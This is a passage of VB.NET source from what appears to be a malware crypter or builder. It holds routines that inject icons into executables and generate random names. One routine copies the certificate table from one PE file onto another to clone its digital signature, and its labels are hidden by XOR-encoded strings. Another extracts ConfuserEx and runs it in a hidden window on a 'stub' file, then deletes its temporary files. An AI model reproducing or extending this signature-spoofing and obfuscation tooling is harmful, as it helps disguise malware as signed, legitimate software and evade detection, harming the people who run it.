    ' bitmap.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)> _
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)> _
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = iconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region
#Region "RANDOM"
Public Class Randomization
    Public Class RandomPassword
        Private Shared DEFAULT_MIN_PASSWORD_LENGTH As Integer = 8
        Private Shared DEFAULT_MAX_PASSWORD_LENGTH As Integer = 10
        Private Shared PASSWORD_CHARS_LCASE As String = "abcdefgijkmnopqrstwxyz"
        Private Shared PASSWORD_CHARS_UCASE As String = "ABCDEFGHJKLMNPQRSTWXYZ"
        Public Shared Function Generate() As String
            Generate = Generate(DEFAULT_MIN_PASSWORD_LENGTH, _
                                DEFAULT_MAX_PASSWORD_LENGTH)
        End Function
        Public Shared Function Generate(ByVal length As Integer) As String
            Generate = Generate(length, length)
        End Function
        Public Shared Function Generate(ByVal minLength As Integer, _
                                ByVal maxLength As Integer) _
          As String
            If (minLength <= 0 Or maxLength <= 0 Or minLength > maxLength) Then
                Generate = Nothing
            End If
            Dim charGroups As Char()() = New Char()() _
            { _
                PASSWORD_CHARS_LCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray()}
            Dim charsLeftInGroup As Integer() = New Integer(charGroups.Length - 1) {}
            Dim I As Integer
            For I = 0 To charsLeftInGroup.Length - 1
                charsLeftInGroup(I) = charGroups(I).Length
            Next
            Dim leftGroupsOrder As Integer() = New Integer(charGroups.Length - 1) {}
            For I = 0 To leftGroupsOrder.Length - 1
                leftGroupsOrder(I) = I
            Next
            Dim randomBytes As Byte() = New Byte(3) {}
            Dim rng As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            rng.GetBytes(randomBytes)
            Dim seed As Integer = ((randomBytes(0) And &H7F) << 24 Or _
                                    randomBytes(1) << 16 Or _
                                    randomBytes(2) << 8 Or _
                                    randomBytes(3))
            Dim random As Random = New Random(seed)
            Dim password As Char() = Nothing
            If (minLength < maxLength) Then
                password = New Char(random.Next(minLength - 1, maxLength)) {}
            Else
                password = New Char(minLength - 1) {}
            End If
            Dim nextCharIdx As Integer
            Dim nextGroupIdx As Integer
            Dim nextLeftGroupsOrderIdx As Integer
            Dim lastCharIdx As Integer
            Dim lastLeftGroupsOrderIdx As Integer = leftGroupsOrder.Length - 1
            For I = 0 To password.Length - 1
                If (lastLeftGroupsOrderIdx = 0) Then
                    nextLeftGroupsOrderIdx = 0
                Else
                    nextLeftGroupsOrderIdx = random.Next(0, lastLeftGroupsOrderIdx)
                End If
                nextGroupIdx = leftGroupsOrder(nextLeftGroupsOrderIdx)
                lastCharIdx = charsLeftInGroup(nextGroupIdx) - 1
                If (lastCharIdx = 0) Then
                    nextCharIdx = 0
                Else
                    nextCharIdx = random.Next(0, lastCharIdx + 1)
                End If
                password(I) = charGroups(nextGroupIdx)(nextCharIdx)
                If (lastCharIdx = 0) Then
                    charsLeftInGroup(nextGroupIdx) = _
                                    charGroups(nextGroupIdx).Length
                Else
                    If (lastCharIdx <> nextCharIdx) Then
                        Dim temp As Char = charGroups(nextGroupIdx)(lastCharIdx)
                        charGroups(nextGroupIdx)(lastCharIdx) = _
                                    charGroups(nextGroupIdx)(nextCharIdx)
                        charGroups(nextGroupIdx)(nextCharIdx) = temp
                    End If

                    charsLeftInGroup(nextGroupIdx) = _
                               charsLeftInGroup(nextGroupIdx) - 1
                End If
                If (lastLeftGroupsOrderIdx = 0) Then
                    lastLeftGroupsOrderIdx = leftGroupsOrder.Length - 1
                Else
                    If (lastLeftGroupsOrderIdx <> nextLeftGroupsOrderIdx) Then
                        Dim temp As Integer = _
                                    leftGroupsOrder(lastLeftGroupsOrderIdx)
                        leftGroupsOrder(lastLeftGroupsOrderIdx) = _
                                    leftGroupsOrder(nextLeftGroupsOrderIdx)
                        leftGroupsOrder(nextLeftGroupsOrderIdx) = temp
                    End If
                    lastLeftGroupsOrderIdx = lastLeftGroupsOrderIdx - 1
                End If
            Next
            Generate = New String(password)
        End Function
    End Class
End Class
#End Region
#Region "SIGNATURE"
Public Class GDigital
    Public Shared Function Digital_Signatures(Razor As String) As String
        Try
            Dim length As Integer = Razor.Length
            Dim array As Char() = New Char(length - 1) {}
            For i As Integer = 0 To array.Length - 1
                Dim c As Char = Razor(i)
                Dim b As Byte = CByte((CInt(AscW(c)) Xor length - i))
                Dim b2 As Byte
                array(i) = CChar(ChrW((CInt(b2) << 8 Or CInt(b))))
            Next
            Return String.Intern(New String(array))
        Catch ex As Exception
        End Try
    End Function
End Class
Friend Class Digital
    Public Shared Function Digital_Signatures(ByVal Signatures As Byte(), ByVal Digital_Signature As Boolean) As Byte()
        Try
            Dim buffer As Byte() = New Byte(4 - 1) {}
            Dim stream As New MemoryStream(Signatures, 0, Signatures.Length)
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num As Integer = BitConverter.ToInt16(buffer, 0)
            If Digital_Signature Then
                stream.Seek(CLng((num + &HA8)), SeekOrigin.Begin)
                stream.Read(buffer, 0, 4)
                Dim num2 As Integer = BitConverter.ToInt32(buffer, 0)
                stream.Read(buffer, 0, 4)
                Dim num3 As Integer = BitConverter.ToInt32(buffer, 0)
                Dim buffer2 As Byte() = New Byte(num3 - 1) {}
                stream.Seek(CLng(num2), SeekOrigin.Begin)
                stream.Read(buffer2, 0, num3)
                stream.Close()
                Return buffer2
            End If
            stream.Seek(CLng((num + &H98)), SeekOrigin.Begin)
            stream.Read(buffer, 0, 4)
            Dim num4 As Integer = BitConverter.ToInt32(buffer, 0)
            stream.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            Dim buffer3 As Byte() = New Byte(count - 1) {}
            stream.Seek(CLng(num4), SeekOrigin.Begin)
            stream.Read(buffer3, 0, count)
            stream.Close()
            Return buffer3
        Catch exception As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function smethod_1(ByVal Signatures As Byte(), ByVal int_0 As Integer, ByVal int_1 As Integer, ByVal Digital_Signature As Boolean) As Byte()
        Dim buffer As Byte() = New Byte(4 - 1) {}
        Dim stream As New MemoryStream(Signatures, 0, Signatures.Length)
        If Digital_Signature Then
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num As Integer = BitConverter.ToInt16(buffer, 0)
            stream.Seek(CLng((num + 160)), SeekOrigin.Begin)
        Else
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num2 As Integer = BitConverter.ToInt16(buffer, 0)
            stream.Seek(CLng((num2 + &H98)), SeekOrigin.Begin)
        End If
        stream.Write(BitConverter.GetBytes(int_1), 0, 4)
        stream.Write(BitConverter.GetBytes(int_0), 0, 4)
        Return stream.ToArray
    End Function
    Public Shared Function Signature(ByVal Signatures As Byte(), ByVal byte_1 As Byte(), ByVal Digital_Signature As Boolean) As Byte()
        Try
            Dim stream As New MemoryStream(byte_1, 0, byte_1.Length)
            Dim buffer As Byte() = New Byte(stream.Length - 1) {}
            stream.Read(buffer, 0, Convert.ToInt32(stream.Length))
            stream.Close()
            Dim stream2 As New MemoryStream(Signatures, 0, Signatures.Length)
            Dim buffer2 As Byte() = New Byte(stream2.Length - 1) {}
            stream2.Read(buffer2, 0, Convert.ToInt32(stream2.Length))
            stream.Close()
            Dim count As Integer = (buffer2.Length + buffer.Length)
            Dim stream3 As New MemoryStream(New Byte(count - 1) {}, 0, count, True, True)
            stream3.Write(buffer2, 0, buffer2.Length)
            stream3.Write(buffer, 0, buffer.Length)
            Dim buffer3 As Byte() = stream3.GetBuffer
            Return Digital.smethod_1(buffer3, buffer.Length, buffer2.Length, Digital_Signature)
        Catch exception As Exception
            Return New Byte(0 - 1) {}
        End Try
    End Function
    Public Shared Function smethod_3(ByVal Signatures As Byte()) As String
        Dim str2 As String
        Dim num As UInt16 = 0
        Dim str As String = String.Empty
        Try
            Using stream As MemoryStream = New MemoryStream(Signatures, 0, Signatures.Length)
                Using reader As BinaryReader = New BinaryReader(stream)
                    If (reader.ReadUInt16 = &H5A4D) Then
                        stream.Seek(&H3A, SeekOrigin.Current)
                        stream.Seek(CLng(reader.ReadUInt32), SeekOrigin.Begin)
                        If (reader.ReadUInt32 = &H4550) Then
                            stream.Seek(20, SeekOrigin.Current)
                            num = reader.ReadUInt16
                        End If
                    End If
                End Using
            End Using
            Select Case num
                Case &H10B
                    str = GDigital.Digital_Signatures("6ĶɁͫѵ")
                    frmMain.Digital_Signature = False
                    Return str
                Case &H20B
                    str = GDigital.Digital_Signatures("3İɁͫѵ")
                    frmMain.Digital_Signature = True
                    Exit Select
                Case 0
                    Throw New Exception
            End Select
            Return str
        Catch exception1 As Exception
            str2 = GDigital.Digital_Signatures("AũɰͤѨժ٦ܠ")
        End Try
        Return str2
    End Function
End Class
#End Region
#Region "CONFUSEREX"
Friend Class Confuser
    <DebuggerNonUserCode()>
    Public Sub New()
    End Sub
    Public Shared Sub Obfuscate(hSlyGQfwnjPpVOnmKFKsqFmQh As String)
        Try

            Dim text As String = Path.GetTempPath() + "configconfuser.crproj"
            Dim text2 As String = My.Resources.config
            Dim text3 As String = Path.GetTempPath() + "Confuser"
            Dim text4 As String = New FileInfo(hSlyGQfwnjPpVOnmKFKsqFmQh).Directory.ToString()
            text2 = text2.Replace("%path%", text4 + "\" + Randomization.RandomPassword.Generate(5, 5)).Replace("%basedir%", text4).Replace("%stub%", hSlyGQfwnjPpVOnmKFKsqFmQh)
            File.WriteAllText(text, text2)
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", My.Resources.ConfuserEx)
            Dim flag As Boolean = Directory.Exists(text3)
            If flag Then
                Directory.Delete(text3, True)
            End If
            Directory.CreateDirectory(text3)
            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", text3)
            Dim process As Process = process.Start(New ProcessStartInfo() With {.FileName = text3 + "\Confuser.CLI.exe", .UseShellExecute = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = "-n " + text})
            process.WaitForExit()
            File.Delete(Path.GetTempPath() + "confuser.zip")
            File.Delete(Path.GetTempPath() + "configconfuser.crproj")
            Directory.Delete(text3, True)
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region